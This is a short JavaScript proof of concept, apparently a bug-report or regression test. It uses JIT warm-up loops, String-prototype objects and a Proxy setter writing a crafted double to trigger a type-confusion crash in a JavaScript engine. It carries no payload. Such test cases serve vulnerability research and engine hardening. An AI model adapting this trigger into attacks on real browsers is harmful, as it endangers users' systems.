const STRING = new String('a');


function opt(use_string, proxy) {
    let tmp = Object.create(null);
    if (use_string)
        tmp = Object.create(STRING);

    tmp.length = 1;

    tmp.a0 = 0x1111;
    tmp.a1 = 0x2222;
    tmp.a2 = 0x3333;
    tmp.a3 = 0x4444;
    tmp.a4 = 0x5555;
    tmp.a5 = 0x6666;
    
    proxy.set_getter_on = tmp;

    const value = tmp.a5;

    return value;
}


function initialize() {
    {
        const object = Object.create(STRING);
        Object.defineProperty(object, 'length', {value: 1, writable: true, enumerable: true, configurable: true});

        object.a0 = 1;
        object.a1 = 1;
        object.a2 = 1;
        object.a3 = 1;
        object.a4 = 1;
        object.a5 = 1;
    }

    {
        const object = Object.create(STRING);

        object.a0 = 1;
        object.a1 = 1;
        object.a2 = 1;
        object.a3 = 1;
        object.a4 = 1;
        object.a5 = 1;
    }
}


function main() {
    const proxy_handler = {set: (object, property, value) => {
        const tmp = {};
        tmp[26] = 2.3023e-320;
        value[26] = 1.1;

        return true;
    }};

    const proxy = new Proxy({}, proxy_handler);

    initialize();

    for (let i = 0; i < 1000; i++) {
        opt(/* use_string */ false, /* proxy */ 1.1);
        opt(/* use_string */ true, /* proxy */ 1.1);
    }
    
    setTimeout(() => {
        const value = opt(/* use_string */ true, proxy);

        // Should crash here.
        value.x = 1234;
    }, 100);
}


main();
